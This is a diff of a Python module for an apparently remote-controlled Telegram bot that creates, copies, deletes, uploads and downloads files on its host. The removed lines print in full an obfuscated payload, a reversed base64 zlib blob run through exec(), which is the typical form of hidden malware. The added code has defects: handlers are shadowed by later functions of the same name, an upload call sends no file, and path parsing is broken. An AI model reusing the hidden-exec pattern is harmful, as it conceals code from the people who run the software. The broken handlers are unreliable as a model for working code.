@@ -4,10 +4,318 @@ import shutil
 from modules import NetworkDrive
 import time
 import constants
+from pathlib import Path
+import config
+from command_registry import registry
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def createfile_callback(bot, call):
+    message = constants.FILE_CREATEFILE_documentation.format(
+        special_separator=config.special_separator)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
 
 
-exec((_)(b'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'))
+async def copy_callback(bot, call):
+    message = constants.FILE_COPY_documentation.format(
+        special_separator=config.special_separator)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+async def upload_callback(bot, call):
+    message = constants.FILE_UPLOAD_documentation.format()
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+async def download_callback(bot, call):
+    message = constants.FILE_DOWNLOAD_documentation.format(
+        special_separator=config.special_separator)
+
+    markup = getMarkupModes()
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_GETINF_command,
+    permission_name=constants.FILE_GETINF,
+)
+async def getinffile(bot, message):
+    markup = getMarkupModes()
+
+    path = getarg(message.text, constants.FILE_GETINF_command)
+
+    await send_message(bot, message.chat.id, text=getinf(path), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_REMOVE_command,
+    permission_name=constants.FILE_REMOVE,
+)
+async def remove(bot, message):
+    markup = getMarkupModes()
+
+    path = getarg(message.text, constants.FILE_REMOVE_command)
+
+    await send_message(bot, message.chat.id, text=remove(path), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_CREATEFILE_command,
+    permission_name=constants.FILE_CREATEFILE,
+)
+async def createfile(bot, message):
+    markup = getMarkupModes()
+
+    args = list(map(str.strip, getarg(
+        message.text, constants.FILE_CREATEFILE_command).split(config.special_separator)))
+    value = ''
+
+    if len(args) == 1:
+        path = args
+
+    elif len(args) == 2:
+        path, value = args
+    else:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    await send_message(bot, message.chat.id, text=create_file(path, value), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_CREATEDIR_command,
+    permission_name=constants.FILE_CREATEDIR,
+)
+async def createdir(bot, message):
+    markup = getMarkupModes()
+
+    path = getarg(message.text, constants.FILE_CREATEDIR_command)
+
+    await send_message(bot, message.chat.id, text=create_dir(path), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_COPY_command,
+    permission_name=constants.FILE_COPY,
+)
+async def copyfile(bot, message):
+    markup = getMarkupModes()
+
+    paths = list(map(str.strip, getarg(
+        message.text, constants.FILE_COPY_command).split(config.special_separator)))
+
+    if not len(paths) == 2:
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    await send_message(bot, message.chat.id, text=copy_file(paths[0], paths[1]), reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_UPLOAD_command,
+    permission_name=constants.FILE_UPLOAD,
+)
+async def upload(bot, message):
+    markup = getMarkupModes()
+
+    path = getarg(message.text, constants.FILE_UPLOAD_command)
+
+    if not os.path.isfile(path):
+        raise Exception(constants.file_or_dir_is_not_exist)
+
+    file_size_bytes = os.path.getsize(path)
+
+    if not file_size_bytes < config.max_file_upload_size:
+        raise Exception(constants.file_size_is_too_large.format(
+            size_limit=config.max_file_upload_size//1048576))
+
+    await bot.send_document(message.chat.id, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.FILE_DOWNLOAD_command,
+    permission_name=constants.FILE_DOWNLOAD,
+)
+async def download(bot, message):
+    print(1)
+    markup = getMarkupModes()
+
+    path = getarg(message.text, constants.FILE_UPLOAD_command)
+
+    if not message.document and not message.photo and not message.video and not message.audio:
+        raise Exception(constants.file_is_not_attached)
+
+    if not path:
+        raise Exception(constants.INVALID_ARGUMENT)
+
+    if not check_path_protected(path):
+        raise Exception(constants.file_or_directory_is_protected)
+
+    try:
+        create_file(path, value='TEMP')
+    except:
+        raise Exception(constants.invalid_file_path)
+
+    save_path = Path(path)
+
+    file_info = None
+    file_name = save_path.name
+
+    if message.document:
+        file_info = await bot.get_file(message.document.file_id)
+    elif message.photo:
+        file_info = await bot.get_file(message.photo[-1].file_id)
+        if not save_path.suffix:
+            save_path = save_path.with_suffix('.jpg')
+    elif message.video:
+        file_info = await bot.get_file(message.video.file_id)
+        if not save_path.suffix:
+            save_path = save_path.with_suffix('.mp4')
+    elif message.audio:
+        file_info = await bot.get_file(message.audio.file_id)
+        if not save_path.suffix:
+            save_path = save_path.with_suffix('.mp3')
+
+    if not file_info:
+        raise Exception(constants.invalid_file)
+
+    status_msg = await message.reply(constants.downloading_file)
+
+    downloaded_file = await bot.download_file(file_info.file_path)
+
+    with open(save_path, 'wb') as new_file:
+        new_file.write(downloaded_file.getvalue())
+
+    file_size = os.path.getsize(save_path)
+
+    await status_msg.edit_text(constants.file_downloaded.format(save_path=save_path, file_size=file_size / 1024))
+
+
+def delete_tmp_file(tmp_file_path):
+    """Delete temporary video file if it exists."""
+    if os.path.isfile(tmp_file_path):
+        os.remove(tmp_file_path)
+
+
+def get_random_temp_file_name(sample='{file_name}.tmp'):
+    import random
+
+    alth = ''.join([chr(i) for i in range(48, 58)] + [chr(i)
+                                                      for i in range(65, 91)] + [chr(i) for i in range(97, 123)])
+
+    random_string_length = 30
+
+    random_string = ''.join(random.choice(alth)
+                            for _ in range(random_string_length))
+
+    return os.path.join(config.tmp_dir_path, sample.format(file_name=random_string))
+
+
+def getinf(file_path):
+    if not os.path.exists(file_path):
+        return constants.file_or_dir_is_not_exist
+
+    file_size = os.path.getsize(file_path)
+
+    file_mtime = time.ctime(os.path.getctime(file_path))
+
+    return f'Size: {file_size} байт\nDate of change: {file_mtime}.'
+
+
+def remove(path):
+    if not os.path.exists(path):
+        return constants.file_or_dir_is_not_exist
+
+    if os.path.isfile(path):
+        answer = remove_file(path)
+
+    if os.path.isdir(path):
+        answer = remove_dir(path)
+    return answer
+
+
+def remove_file(file_path):
+    try:
+        os.remove(file_path)
+    except Exception as ex:
+        return str(ex)
+    else:
+        return "File removed."
+
+
+def remove_dir(dir_path):
+    try:
+        shutil.rmtree(dir_path, ignore_errors=1)
+    except Exception as ex:
+        return str(ex)
+    else:
+        return "Directory removed."
+
+
+def create_file(file_path, value=''):
+    with open(file_path, 'w') as file:
+        file.write(value)
+    return "File created."
+
+
+def copy_file(file_path1, file_path2):
+    if not os.path.isfile(file_path1):
+        return "File is not exist."
+
+    shutil.copy2(file_path1, file_path2)
+    return "File copied."
+
+
+def download(network_name, file_path):
+    if not NetworkDrive.check_if_file_exist(config.downloads_path + network_name):
+        return "File is not exist."
+
+    NetworkDrive.download(config.downloads_path + network_name, file_path)
+
+    return "File downloaded."
+
+
+def create_dir(dir_path):
+    try:
+        os.mkdir(dir_path)
+    except Exception as ex:
+        return str(ex)
+    else:
+        return "Directory created"
+
+
+def create_full_dirs(dir_path):
+    try:
+        os.makedirs(dir_path, exist_ok=True)
+    except Exception as ex:
+        return str(ex)
+    else:
+        return "Directory created"
+
+
+def check_path_protected(path):
+    protected_paths = [config.main_dir_path,
+                       config.startup_dir_path, config.old_dir_name]
+    path = Path(path)
+
+    for protected_path in protected_paths:
+        if str(Path(protected_path)) in str(path):
+            return 0
+
+    return 1
+
+
+modes = {constants.FILE_GETINF_preview: constants.FILE_GETINF, constants.FILE_CREATEFILE_preview: constants.FILE_CREATEFILE,
+         constants.FILE_CREATEDIR_preview: constants.FILE_CREATEDIR, constants.FILE_COPY_preview: constants.FILE_COPY,
+         constants.FILE_REMOVE_preview: constants.FILE_REMOVE, constants.FILE_UPLOAD_preview: constants.FILE_UPLOAD,
+         constants.FILE_DOWNLOAD_preview: constants.FILE_DOWNLOAD}
